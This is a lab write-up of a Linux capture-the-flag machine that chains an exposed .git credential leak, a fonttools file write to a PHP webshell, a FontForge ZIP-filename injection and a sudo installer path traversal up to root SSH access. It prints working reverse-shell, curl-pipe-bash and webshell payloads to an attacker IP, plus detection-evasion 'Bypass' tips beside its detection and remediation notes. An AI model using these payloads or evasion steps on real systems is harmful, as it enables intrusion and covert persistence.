# VariaType

**OS:** Linux · **Difficulty:** Medium · **IP:** 10.129.12.80 · **Platform:** Linux

---

## Summary

A variable font generation service on the main domain processes `.designspace` files using the fonttools Python library. A second subdomain `portal.variatype.htb` is discovered during enumeration. The portal exposes a `.git` directory: a full repository dump via git-dumper extracts commit history containing hardcoded credentials for a `gitbot` account. Authenticated access to the portal dashboard reveals a font submission interface that also processes `.designspace` files. GHSA-768j-98cg-p3fv allows the `filename` attribute of the `<variable-font>` element to specify an arbitrary write path, and the `labelname` CDATA content is written into that file: producing a PHP webshell at a web-accessible path. The webshell delivers a reverse shell as `www-data`. A backup script in `/opt/` processes uploaded archives using fontforge, vulnerable to CVE-2024-25082: a filename-based command injection where backtick-enclosed shell commands in a ZIP entry's filename are evaluated by bash before fontforge receives them. A crafted ZIP delivers a shell as `steve`. `steve` has passwordless sudo access to a Python plugin installer that fetches a URL and writes its content to a specified path. The path is attacker-controlled via URL-encoded path injection in the script's argument: used to write an attacker SSH public key to `/root/.ssh/authorized_keys`, completing full system compromise.

---

## Methodology Notes

**What was new or unusual:**
The fonttools designspace path traversal (GHSA-768j-98cg-p3fv) is not a standard injection: it exploits the legitimate file output path specified in the designspace XML schema itself. The library writes its output to whatever path the `filename` attribute specifies, and the `labelname` CDATA content travels into that file. The combination of a controlled write path and controlled written content is a complete arbitrary file write primitive requiring no memory corruption or binary exploitation. The fontforge CVE-2024-25082 is a shell command injection via filename: the vulnerability lives entirely in a bash script that passes the extracted filename into a double-quoted shell command, making backtick execution trivial. Both vulnerabilities reward understanding the processing pipeline rather than pattern-matching to known exploit signatures.

**Mistakes made and corrections:**
Early attempts at using the fonttools designspace vulnerability on the main variatype.htb site focused on overwriting privileged files: `/root/.ssh/authorized_keys`, system crontabs: which either failed due to permission restrictions or produced no visible effect. These were correctly identified as a dead end and abandoned. The key lesson is that arbitrary file write on a web server is most reliably exploited by writing to a web-accessible path the process already owns, not by reaching for high-privilege paths that the web server user cannot write to. Full enumeration of the portal subdomain was required before the attack surface became clear: the correct approach is to enumerate every discovered domain fully before attempting exploitation.

**What would be done differently:**
Before exploiting any file write primitive, map what the process user can actually write to first: check `/proc/self/environ` for effective UID, check writable paths systematically, and confirm the web root is writable before attempting privileged paths. For CVE-2024-25082, the backtick injection in a ZIP filename is subtle: the correct approach is to read the vulnerable script first and trace exactly where the filename lands in the shell command before crafting the payload. The `install_validator.py` privilege escalation via URL path injection rewards reading the script source carefully: the write destination is derived from the URL path, making it a path traversal rather than a direct argument.

---

## Recon

### Port Scan : MITRE: T1046: Network Service Scanning

```
nmap -p- -Pn -T4 --min-rate 5000 10.129.12.80
nmap -sCV -p22,80 10.129.12.80
```

```
22/tcp  open  ssh   OpenSSH (Debian)
80/tcp  open  http  nginx
```

**Logs Generated:**
1. nginx access log records HTTP probes from nmap NSE scripts with the nmap NSE user-agent string.
2. No SSH daemon log entry from a banner grab: connection never reaches PAM authentication.
3. Host-based firewall verbose logging would record inbound SYN packets if configured: not active in a default Debian install.

**Alerts Triggered:**
1. No alert on a default nginx or OpenSSH install from connection attempts.
2. Snort SID 1228 and Suricata `ET SCAN Nmap Scripting Engine User-Agent Detected` fire on NSE HTTP probes reaching port 80.
3. A tuned SIEM correlating port sweep volume per source IP over a short window would flag this.

**Network Artifacts:**
1. High-volume TCP SYN packets across all 65535 ports from a single source IP in a compressed window.
2. NSE HTTP GET requests with nmap user-agent against port 80.
3. SSH banner grab visible in full PCAP.

**Artifacts Left:**
1. nmap NSE user-agent string in nginx access log.
2. No files written to disk on the target.

**Sysmon / EDR:**
1. No local process artifact on the target from an external scan.
2. A deployed EDR with network anomaly detection would log the inbound SYN flood pattern.

**SIEM Correlation:**
```
index=network sourcetype=firewall_logs | stats dc(dest_port) as ports_scanned by src_ip | where ports_scanned > 1000 | sort -ports_scanned
```

**Sigma Rule:**
1. [proc_creation_lnx_susp_nmap.yml](https://github.com/SigmaHQ/sigma/search?q=nmap): detects nmap execution on the scanning host. Network-side detection requires firewall or IDS log sources.

**Bypass:**
1. `-T1` or `-T2` reduces packet rate below threshold-based IDS rules.
2. `-D RND:5` distributes SYN packets across decoy source IPs, defeating per-IP SIEM aggregation.
3. Replace the NSE user-agent via `--script-args http.useragent="Mozilla/5.0 (X11; Linux x86_64; rv:128.0)"`.

**Remediation:**
1. Restrict inbound access to ports 22 and 80 to known IP ranges at the network perimeter.
2. Deploy Suricata with scan detection rules in alerting mode.

**OpSec Rating:** Loud: high-rate full-range SYN sweep is one of the most recognisable traffic signatures in network security monitoring.

---

### Subdomain Enumeration : MITRE: T1595.003: Active Scanning: Wordlist Scanning

Virtual host enumeration is mandatory after confirming a web server. The main domain `variatype.htb` hosts a public variable font generation tool. A second subdomain is required to find the actual authenticated attack surface: without this step the portal is entirely invisible.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -ac
```

```
portal.variatype.htb   [Status: 200]
```

Added to `/etc/hosts`:
```
10.129.12.80 variatype.htb portal.variatype.htb
```

**Logs Generated:**
1. Every request in nginx access log with varying `Host` header values from a single source IP: recognisable virtual host fuzzing pattern.
2. Content-length differences in responses identify the valid virtual host.

**Alerts Triggered:**
1. No native nginx alert.
2. A WAF or rate-limiting rule fires on the request volume and `Host` header variation pattern.
3. ModSecurity with OWASP CRS would detect the scanning pattern.

**Network Artifacts:**
1. High volume of HTTP GET requests from a single IP with sequentially varying `Host` header values.

**Artifacts Left:**
1. Full request volume in nginx access log with ffuf user-agent.

**Sysmon / EDR:**
1. Network-layer activity: no process spawned on the target.

**SIEM Correlation:**
```
index=web sourcetype=nginx_access | stats dc(http_host) as hosts_tried by clientip | where hosts_tried > 50
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=web+scan): detects anomalous `Host` header variation and scanner user-agent strings.

**Bypass:**
1. Certificate transparency log enumeration via `crt.sh`: finds subdomains with zero server-side log entries.
2. Replace ffuf user-agent with a browser string to remove the scanner signature.

**Remediation:**
1. Return identical responses for all unrecognised `Host` header values.
2. Rate-limit requests per source IP at the nginx level.

**OpSec Rating:** Moderate: virtual host fuzzing generates a distinct access log pattern but requires content-analysis tooling to detect reliably.

---

### Portal Web Enumeration: .git Directory Exposure : MITRE: T1083: File and Directory Discovery

```
gobuster dir -u http://portal.variatype.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 50 -x .php,.txt,.git
```

```
/.git           (Status: 301)
/.git/config    (Status: 200)
/.git/index     (Status: 200)
/.git/HEAD      (Status: 200)
/dashboard.php  (Status: 302)
/files          (Status: 301)
/download.php   (Status: 302)
```

A `.git` directory is publicly accessible: the web server is serving the repository's internal Git metadata. `/.git/HEAD` confirms an active branch (`ref: refs/heads/master`) and `/.git/config` discloses the author identity (`dev@variatype.htb`). This is not an empty stub: it is a live repository with commit history, file index, and potentially credentials in the commit log.

**Logs Generated:**
1. Every gobuster request in nginx access log with default gobuster user-agent.
2. High 404 volume from a single IP in seconds.
3. The `.git/` path accesses themselves are recorded as 200/301 responses: distinguishable from gobuster noise by their specific paths.

**Alerts Triggered:**
1. No native nginx alert.
2. ModSecurity would flag the `.git/` path access pattern: known sensitive path disclosure.
3. A WAF rule specifically blocking `/.git/` access would return 403 and alert.

**Network Artifacts:**
1. Sequential HTTP GET requests with gobuster user-agent.
2. HTTP 200 responses for `.git/HEAD`, `.git/config`, `.git/index`: sensitive Git internals served over HTTP.

**Artifacts Left:**
1. Gobuster user-agent string throughout nginx access log.
2. All `.git/` access requests individually logged.

**Sysmon / EDR:**
1. Web application scanning is network-layer: no process spawned on the target.

**SIEM Correlation:**
```
index=web sourcetype=nginx_access uri="*/.git/*" | stats count by clientip, uri
```
Any access to `.git/` paths is an immediate indicator of reconnaissance against version control metadata.

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=web+scan): detects scanner user-agent strings.
2. No dedicated Sigma rule for `.git/` path access detection in nginx logs: a custom rule alerting on requests containing `/.git/` in the URI is a recommended addition to any web-facing application.

**Bypass:**
1. Replace gobuster user-agent with a browser string to remove the scanner signature.
2. Access `.git/HEAD` directly without directory enumeration: a single targeted request is indistinguishable from a misconfigured crawler in logs.

**Remediation:**
1. Block all access to `.git/` and all dot-directories at the nginx level: `location ~ /\. { deny all; }`.
2. Exclude the `.git/` directory from the web root entirely: the repository should never be in a web-accessible path.
3. This is a critical finding independent of any credentials it exposes: the repository structure alone reveals the application's codebase.

**OpSec Rating:** Moderate: gobuster user-agent and 404 volume are detectable. The `.git/` accesses themselves are high-signal events that warrant their own alerting regardless of tool.

---

## Foothold

### Git Repository Dump: Credential Extraction : MITRE: T1552.001: Unsecured Credentials: Credentials in Files · T1213: Data from Information Repositories

When a `.git/` directory is served over HTTP, the entire repository history is reconstructable by fetching the objects referenced from `HEAD` through the commit graph. The `git-dumper` tool automates this: it walks the Git object graph by fetching `HEAD`, resolving the commit reference, fetching each commit object, and recursively fetching all tree and blob objects referenced. The result is a fully functional local clone of the repository including all commits, file content, and crucially, anything that was ever committed and later removed. Developers who commit credentials and then delete them in a follow-up commit believe the data is gone: it is not. Every commit is permanent in the Git object store until explicit garbage collection, and the exposed HTTP server serves all of it.

```
git clone https://github.com/arthaud/git-dumper.git && cd git-dumper
python3 git_dumper.py http://portal.variatype.htb/ .
git log --oneline --all --full-history
git log -p
```

```
753b5f5  fix: add gitbot user for automated validation pipeline
5030e79  feat: initial portal implementation
```

Commit `753b5f5` diff shows `auth.php` modified to add a hardcoded credential:

```php
$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];
```

**Logs Generated:**
1. git-dumper issues hundreds of HTTP GET requests to `.git/` object paths: each request recorded in nginx access log with the tool's user-agent string.
2. All object fetch requests follow the Git object URL schema (`/.git/objects/xx/yyyyyy...`): recognisable in access logs.

**Alerts Triggered:**
1. No native nginx alert.
2. A WAF rule blocking `.git/` access entirely would have prevented the dump: the alert would have fired at the enumeration stage, not here.
3. A SIEM correlating high volume of requests to `.git/objects/` paths from a single IP would flag this.

**Network Artifacts:**
1. Hundreds of HTTP GET requests to `/.git/objects/` paths from a single source IP.
2. git-dumper user-agent string across all requests.
3. Repository content served in plaintext: all object data visible in PCAP.

**Artifacts Left:**
1. All `.git/object` fetch requests in nginx access log: a forensically complete record of what was dumped.
2. No files written to disk on the target.

**Sysmon / EDR:**
1. Web application repository dump is network-layer: no process spawned on the target.

**SIEM Correlation:**
```
index=web sourcetype=nginx_access uri="*/.git/objects/*" | stats count by clientip | where count > 20 | sort -count
```

**Sigma Rule:**
1. [web_scan_generic_product.yml](https://github.com/SigmaHQ/sigma/search?q=git+dump): detects known scanner user-agent strings. No dedicated git-dumper Sigma rule exists: the `.git/objects/` access pattern is the primary indicator.

**Bypass:**
1. Issue object fetch requests with a browser user-agent: removes the tool signature from logs. The `.git/objects/` path pattern remains as the only indicator.
2. Slow the request rate to a few requests per second: blends into background web traffic volume while extending dump time.

**Remediation:**
1. Block `.git/` at the nginx level immediately: this eliminates the entire attack surface.
2. Rotate the `gitbot` credential immediately: once a credential has been committed to a repository, it must be considered compromised regardless of whether it was later removed.
3. Audit all historical commits across all branches for committed secrets using tools such as `truffleHog` or `git-secrets`.

**OpSec Rating:** Moderate: the `.git/objects/` request volume is a recognisable pattern but requires specific log monitoring to detect. A single well-targeted request to `.git/HEAD` to confirm exposureleaves almost no footprint.

---

### Portal Authentication: gitbot : MITRE: T1078: Valid Accounts

```
http://portal.variatype.htb/dashboard.php
```

Authenticated with `gitbot:G1tB0t_Acc3ss_2025!`. Dashboard reveals a font submission interface accepting `.designspace` files alongside font source files.

**Logs Generated:**
1. Login POST to portal authentication endpoint in nginx access log.
2. PHP session created: session token issued and valid until expiry.

**Alerts Triggered:**
1. No alert on a default configuration for a single successful login.
2. The source IP of the login is the attacker's HTB VPN address: anomalous if a new-source-IP baseline exists for `gitbot`.

**Network Artifacts:**
1. HTTP POST to the login endpoint with credentials in the body: visible in plaintext if unencrypted.
2. Session cookie issued in the response.

**Artifacts Left:**
1. Login event in nginx access log.
2. PHP session file on the server.

**Sysmon / EDR:**
1. Web application authentication: no process spawned on the target.

**SIEM Correlation:**
```
index=web sourcetype=nginx_access method=POST uri="*/auth.php" | stats count by clientip, status
```

**Sigma Rule:**
1. No portal-specific Sigma rule. Generic web authentication anomaly detection applies.

**Bypass:**
1. No bypass required: valid credentials accepted unconditionally.

**Remediation:**
1. Rotate all credentials recovered from the repository immediately.
2. The `gitbot` account should not exist as a persistent portal user: automation accounts should use API tokens with narrow scope, not application passwords.

**OpSec Rating:** Silent: one successful POST to a login form is indistinguishable from legitimate access in a default environment.

---

### GHSA-768j-98cg-p3fv: fonttools Designspace Arbitrary File Write → PHP Webshell

The fonttools library processes `.designspace` XML files to build variable fonts from multiple source masters. The `<variable-font>` element's `filename` attribute specifies where the output variable font file should be written. In vulnerable versions, this path is accepted without restriction: allowing an attacker to specify any filesystem path writable by the process. The `labelname` element's CDATA content is processed as axis label metadata and written as part of the output file's content. When the write path is given a `.php` extension pointing to a web-accessible directory, and the CDATA content contains a PHP payload, the result is a PHP webshell written to a location the web server will execute.

This is not a memory corruption vulnerability: it is a path validation absence. The library does exactly what the XML instructs it to do. The security assumption that input files are trusted and process-controlled is violated when user-supplied designspace files are accepted without stripping or validating the `filename` attribute.

The malicious `.designspace` file:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
```

Submitted via the portal dashboard alongside dummy `.ttf` source files. Webshell written to `/var/www/portal.variatype.htb/public/files/shell.php`.

Execution confirmed:

```
http://portal.variatype.htb/files/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell delivered via two-stage fetch:

```
cat > rev.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.150/7331 0>&1
EOF
python3 -m http.server 8081
nc -lvnp 7331
```

```
http://portal.variatype.htb/files/shell.php?cmd=curl%20http://10.10.16.150:8081/rev.sh%20|%20bash
```

Shell received as `www-data`.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

**Logs Generated:**
1. The designspace file upload POST recorded in nginx access log.
2. fonttools writes `shell.php` to `/var/www/portal.variatype.htb/public/files/`: file creation timestamp forensically recoverable.
3. HTTP GET to `shell.php?cmd=id` in nginx access log: the `cmd` parameter value visible in the URI.
4. HTTP GET to `shell.php?cmd=curl...` triggering the reverse shell: full URL-encoded payload in nginx access log.
5. Outbound TCP connection from `www-data` process to `10.10.16.150:7331`: visible in network flow data.
6. Inbound HTTP GET to the attacker's Python HTTP server from the target fetching `rev.sh`.

**Alerts Triggered:**
1. A PHP file created in the web-accessible files directory by the fonttools process is a high-confidence web shell indicator: file integrity monitoring on `/var/www/` would alert immediately.
2. Outbound TCP connection from the nginx/PHP process to an external IP on a non-standard port (7331) is a reverse shell indicator. Egress filtering blocking non-standard outbound ports would prevent shell delivery.
3. No alert in a default configuration without FIM or egress filtering.

**Network Artifacts:**
1. Multipart POST upload containing the malicious `.designspace` file: full XML payload visible in PCAP.
2. HTTP GET to `shell.php` with shell commands in the `cmd` parameter: visible in cleartext.
3. Outbound TCP SYN from the target to `10.10.16.150:7331`.
4. Inbound HTTP GET from target to attacker's Python HTTP server fetching `rev.sh`.
5. Reverse shell session content transmitted as cleartext.

**Artifacts Left:**
1. `shell.php` webshell on disk in `/var/www/portal.variatype.htb/public/files/`: persists until deleted.
2. `rev.sh` fetched from the attacker server: executed in memory, not written to disk on the target in this delivery method.
3. All nginx access log entries for both the upload and the webshell accesses.

**Sysmon / EDR:**
1. Linux EDR logs file creation event for `shell.php` in a web directory by the fonttools process: a service process writing a PHP file to the web root is an immediate post-exploitation indicator.
2. Process tree on reverse shell: `php-fpm -> bash -> curl -> bash`: a PHP process spawning a shell with an outbound network socket.
3. File integrity monitoring (AIDE, Wazuh FIM) watching `/var/www/` generates an immediate alert on new PHP file creation.

**SIEM Correlation:**
```
index=web sourcetype=nginx_access | search "shell.php" OR "cmd=" | stats count by clientip, uri
```
```
index=network sourcetype=firewall_logs direction=outbound dest_port=7331 | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [file_creation_lnx_web_shell.yml](https://github.com/SigmaHQ/sigma/search?q=web+shell+linux): detects PHP file creation in web-accessible directories by web application processes.
2. [proc_creation_lnx_reverse_shell.yml](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+linux): detects shell processes spawning with outbound network connections.

**Bypass:**
1. Use a randomly named file rather than `shell.php`: avoids filename-based FIM signatures. Combine with immediate cleanup after shell delivery to minimise the FIM detection window.
2. Use port 443 for the reverse shell callback: blends outbound connection into expected HTTPS traffic patterns.
3. Deliver the payload in a single stage by encoding the full reverse shell in the `cmd` parameter rather than fetching `rev.sh`: eliminates the Python HTTP server inbound connection as an artifact.
4. Delete `shell.php` immediately after the reverse shell is established: the FIM alert fires on creation, but cleanup reduces the forensic window.

**Remediation:**
1. Validate and strip the `filename` attribute in designspace file processing: reject any path outside a designated safe output directory.
2. Run the fonttools processing in a sandboxed environment with a restricted filesystem view: the output directory should be isolated from the web root.
3. Apply the fonttools patch for GHSA-768j-98cg-p3fv.
4. Deploy file integrity monitoring on `/var/www/`: any new PHP file creation outside of application deployment events should trigger an immediate alert.

**OpSec Rating:** Loud: writing a PHP webshell to the web root and delivering a reverse shell generates file system, process, and network artifacts detectable at multiple layers.

---

## Lateral Movement

### CVE-2024-25082: FontForge Command Injection via ZIP Filename: www-data → steve

```
find /opt /home /var -name "*.bak" -o -name "*.sh" 2>/dev/null
```

```
/opt/process_client_submissions.bak
```

The backup script reveals a client submission processing pipeline. The script extracts uploaded ZIP archives and passes extracted filenames directly into a bash command string invoking fontforge:

```bash
UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
EXTENSIONS=( "*.ttf" "*.otf" "*.zip" "*.tar" )
SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

for file in $ext; do
    if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then quarantine; fi
    timeout 30 fontforge -lang=py -c "import fontforge; font = fontforge.open('$file') ..."
done
```

CVE-2024-25082 exploits the direct insertion of a filename into a double-quoted bash string. The `SAFE_NAME_REGEX` validates the ZIP archive's outer filename, but not the filenames of entries inside the ZIP. When the ZIP is extracted, the inner entry filename is passed to fontforge via the shell command string. A backtick-enclosed command inside the inner filename is evaluated by bash as command substitution before fontforge receives control: because bash processes the double-quoted string and expands backticks before passing the argument. The regex gate never sees the inner filename.

The reverse shell command is Base64-encoded to avoid spaces and special characters that would break the bash command line. The evil filename takes the form:

```
dummy`echo BASE64_PAYLOAD | base64 -d | bash`.ttf
```

Craft and deliver the payload:

```python
import zipfile, base64

rev = "bash -i >& /dev/tcp/10.10.16.150/1313 0>&1"
b64 = base64.b64encode(rev.encode()).decode()
evil_name = f"dummy`echo {b64} | base64 -d | bash`.ttf"

with zipfile.ZipFile("pwn.zip", "w") as z:
    z.writestr(evil_name, b"fake font data")
```

```
python3 pwn.py
python3 -m http.server 8081
nc -lvnp 1313
```

Drop the ZIP into the monitored upload directory via the existing `www-data` shell:

```
cd /var/www/portal.variatype.htb/public/files
curl http://10.10.16.150:8081/pwn.zip -o pwn.zip
```

Processing script executes. Shell received as `steve`.

```
uid=1000(steve) gid=1000(steve) groups=1000(steve)
```

**Logs Generated:**
1. `curl` fetching `pwn.zip` from the attacker server: outbound HTTP GET from `www-data` process.
2. `pwn.zip` written to the upload directory: file creation timestamp on target.
3. The processing script's execution logged in syslog if cron or systemd timer logging is active.
4. fontforge invoked with the malicious command string: `execve` event in auditd if active, showing the full argument including the backtick payload.
5. Outbound TCP connection from the fontforge/bash process to `10.10.16.150:1313`.

**Alerts Triggered:**
1. Outbound TCP connection from a font processing utility to an external IP on port 1313 is a high-confidence post-exploitation indicator.
2. A process monitoring tool watching fontforge's child processes would alert on `bash` being spawned as a child of fontforge.
3. No alert in a default configuration without process ancestry monitoring or egress filtering.

**Network Artifacts:**
1. Inbound HTTP GET from the target fetching `pwn.zip` from the attacker server.
2. Outbound TCP SYN from `10.129.12.80` to `10.10.16.150:1313` initiated by the fontforge process.
3. Reverse shell session content as cleartext TCP stream.

**Artifacts Left:**
1. `pwn.zip` in the upload directory: contains the malicious inner filename forensically recoverable via ZIP inspection.
2. Extracted inner filename on disk during processing: may persist in a temp directory depending on the script's cleanup behaviour.
3. All syslog and auditd entries from the processing run.

**Sysmon / EDR:**
1. Linux EDR logs process creation: `bash (cron) -> fontforge -> bash`: fontforge spawning a shell is an immediate privilege escalation indicator.
2. The full fontforge command argument including the Base64-encoded payload is visible to EDR and auditd `execve` monitoring.
3. Process tree with external network socket: `fontforge -> bash -> nc` or equivalent.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit type=EXECVE comm=fontforge | search "base64" OR "|" | stats count by uid, ppid
```
```
index=network sourcetype=firewall_logs direction=outbound dest_port=1313 | stats count by src_ip, dest_ip
```

**Sigma Rule:**
1. [proc_creation_lnx_susp_process_exec_from_tmpdir.yml](https://github.com/SigmaHQ/sigma/search?q=fontforge+command+injection): no fontforge-specific rule exists. The relevant detection is anomalous child process spawning from a font processing utility.
2. [proc_creation_lnx_reverse_shell.yml](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+linux): detects shell processes spawning with outbound network connections.

**Bypass:**
1. The Base64 encoding already removes most special character restrictions. Using a longer Base64 payload wrapped in `$(...)` rather than backticks changes the substitution syntax: less likely to match backtick-specific detection patterns.
2. Use port 443 for the callback to blend into expected outbound HTTPS traffic.
3. A compiled binary delivered to the target and invoked from the filename removes the `bash` child from the fontforge process tree: `dummy$(curl http://attacker/rev -o /tmp/r;chmod +x /tmp/r;/tmp/r).ttf` using a pre-compiled reverse shell binary avoids spawning `bash` directly.

**Remediation:**
1. Validate ZIP entry filenames before extraction: reject any entry filename failing the `SAFE_NAME_REGEX` check that is applied to the outer ZIP filename.
2. Never pass user-controlled or archive-derived filenames directly into a bash command string: use an array-based command invocation (`fontforge -lang=py -c "..." -- "$file"`) which prevents shell interpretation.
3. Apply the CVE-2024-25082 patch.
4. Run the processing script under a dedicated low-privilege service account with no network access and restricted filesystem write permissions.

**OpSec Rating:** Loud: fontforge spawning a shell with an external network connection is a high-confidence post-exploitation process chain detectable by any EDR with process ancestry analysis.

---

## Privilege Escalation

### Sudo Enumeration : MITRE: T1069: Permission Groups Discovery

```
sudo -l
```

```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

The wildcard `*` permits any argument to be passed to the script. Reading the script reveals its function: it accepts a URL, downloads the content, and writes it to a destination path derived from the URL's path component. The destination path is extracted directly from the URL: meaning a URL-encoded path traversal in the URL argument controls where the downloaded content is written, with root permissions.

**Logs Generated:**
1. `sudo -l` execution in `/var/log/auth.log`: `steve : TTY=pts/0 ; COMMAND=list`.
2. auditd `execve` event for `sudo -l` if auditd is active.

**Alerts Triggered:**
1. No alert on a default configuration.
2. `sudo -l` immediately following lateral movement from `www-data` to `steve` is a recognisable post-compromise enumeration pattern in a tuned SIEM.

**Network Artifacts:**
1. None: local command execution, no network traffic.

**Artifacts Left:**
1. `sudo -l` in `/home/steve/.bash_history`.
2. auth.log entry recording the sudo list query.

**Sysmon / EDR:**
1. Linux EDR logs `sudo -l` process creation: parent chain from the fontforge reverse shell session.
2. `sudo` execution in a newly established lateral movement shell from `www-data` to `steve` is a recognisable post-compromise enumeration chain.

**SIEM Correlation:**
```
index=os sourcetype=linux_secure "COMMAND=list" user=steve | stats count by src_ip
```

**Sigma Rule:**
1. [lnx_sudo_privilege_enumeration.yml](https://github.com/SigmaHQ/sigma/search?q=sudo+enumeration): detects `sudo -l` execution, particularly correlated with remote login or lateral movement events.

**Bypass:**
1. Read `/etc/sudoers` and `/etc/sudoers.d/` directly if readable: avoids executing `sudo` and produces no auth.log entry.

**Remediation:**
1. The `install_validator.py` wildcard sudo permission is the core misconfiguration: remove it or restrict to explicitly safe arguments only.

**OpSec Rating:** Silent: single low-severity auth.log entry that no default rule monitors independently.

---

### install_validator.py: URL Path Injection → SSH Key Write as Root : MITRE: T1548.003: Abuse Elevation Control Mechanism: Sudo · T1098.004: Account Manipulation: SSH Authorized Keys

`install_validator.py` is a Python plugin installer that accepts a URL argument, downloads the content, and writes it to a destination path derived from the URL's path component. When the URL path is `%2Froot%2F.ssh%2Fauthorized_keys`: a URL-encoded absolute path: the script decodes the path component and writes the downloaded content to `/root/.ssh/authorized_keys` with root privileges. This is a path traversal via URL decoding: the intent was likely to install plugins into a fixed local directory, but the destination path is derived from the URL path without stripping or normalising it, allowing any writable path on the filesystem to be targeted.

Rather than attempting a direct root shell (which failed: the script validates or restricts what it executes), the correct approach is to use the script's write primitive to plant an SSH public key. An attacker-controlled Python HTTP server serves the public key as the response to any GET request, and the URL path argument encodes the destination as `/root/.ssh/authorized_keys`.

Generate SSH key pair on the target:

```
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
cp /tmp/rootkey.pub /tmp/authorized_keys
```

Serve the public key via a custom HTTP server that always returns the key file regardless of requested path:

```python
import http.server, socketserver

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        with open("/tmp/authorized_keys", "rb") as f:
            self.wfile.write(f.read())

with socketserver.TCPServer(("", 8888), Handler) as httpd:
    httpd.serve_forever()
```

```
python3 /tmp/custom_server.py
```

Invoke the installer with the URL-encoded target path:

```
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.16.150:8888/%2Froot%2F.ssh%2Fauthorized_keys
```

```
[INFO] Downloading http://10.10.16.150:8888/%2Froot%2F.ssh%2Fauthorized_keys
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

```
ssh -i /tmp/rootkey root@10.129.12.205
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**Logs Generated:**
1. `sudo /usr/bin/python3 /opt/font-tools/install_validator.py ...` recorded in `/var/log/auth.log`: the full URL argument including the URL-encoded path is visible in the log entry.
2. auditd `execve` event for `sudo` and `python3` with the full argument list if auditd is active.
3. Outbound HTTP GET from the root-context Python process to `10.10.16.150:8888`: visible in network flow data and firewall logs.
4. File write to `/root/.ssh/authorized_keys` by the root Python process: file modification event.
5. SSH login as `root` from the attacker IP using the injected key recorded in `/var/log/auth.log`.

**Alerts Triggered:**
1. A write to `/root/.ssh/authorized_keys` by any process other than a root interactive session is a critical persistence indicator: file integrity monitoring on `/root/.ssh/` would alert immediately.
2. Outbound HTTP connection from a root-context Python process to an external IP is anomalous: a server process running as root should not be initiating outbound connections to attacker-controlled hosts.
3. SSH login as `root` from a new source IP using a key that was not previously present is detectable if SSH key fingerprint baseline monitoring is in place.
4. No alert in a default configuration without FIM on `/root/.ssh/` or outbound connection monitoring for privileged processes.

**Network Artifacts:**
1. Outbound HTTP GET from `10.129.12.205` to `10.10.16.150:8888` initiated by the root Python process.
2. HTTP response containing the attacker's SSH public key: transmitted in plaintext.
3. SSH connection from `10.10.16.150` to `10.129.12.205:22` using the injected key shortly after the installer runs.

**Artifacts Left:**
1. Attacker's SSH public key permanently written to `/root/.ssh/authorized_keys`: persists until root removes it.
2. auth.log entries for the `sudo` invocation (with full URL argument visible) and the subsequent SSH root login.
3. `/tmp/rootkey` and `/tmp/authorized_keys` on the target if not cleaned up.
4. `/tmp/custom_server.py` on the target.
5. auditd entries for `execve` and file write syscalls if auditd is active.

**Sysmon / EDR:**
1. Linux EDR logs file write to `/root/.ssh/authorized_keys` by the Python process: an absolute highest-severity indicator. This path is a standard FIM monitoring target in any security-conscious deployment.
2. Process tree: `sudo -> python3 install_validator.py` initiating an outbound HTTP connection and writing to a sensitive path: the combination of sudo execution, outbound network call, and sensitive file write in one process chain is a clear privilege escalation indicator.

**SIEM Correlation:**
```
index=os sourcetype=linux_audit type=PATH name="/root/.ssh/authorized_keys" nametype!="PARENT" | stats count by pid, uid, comm
```
Any write to `/root/.ssh/authorized_keys` outside of root's own interactive session.

```
index=network sourcetype=firewall_logs direction=outbound | where src_process="python3" AND src_uid=0 | stats count by dest_ip, dest_port
```
Root-context Python process initiating outbound HTTP connections.

**Sigma Rule:**
1. [lnx_ssh_authorized_keys_modification.yml](https://github.com/SigmaHQ/sigma/search?q=authorized_keys): detects creation or modification of SSH `authorized_keys` files by unexpected processes.
2. [lnx_sudo_privilege_escalation_via_script.yml](https://github.com/SigmaHQ/sigma/search?q=sudo+script+privilege+escalation): detects anomalous sudo execution patterns where the privileged script initiates outbound network connections.

**Bypass:**
1. The auth.log entry for the `sudo` invocation is unavoidable: it is written by the sudo facility at the OS level. The URL argument containing the URL-encoded `/root/.ssh/authorized_keys` path is permanently recorded in the log.
2. Rename `/tmp/custom_server.py` to something neutral before running: `python3 /tmp/metrics_helper.py` changes the script name visible in process arguments to EDR.
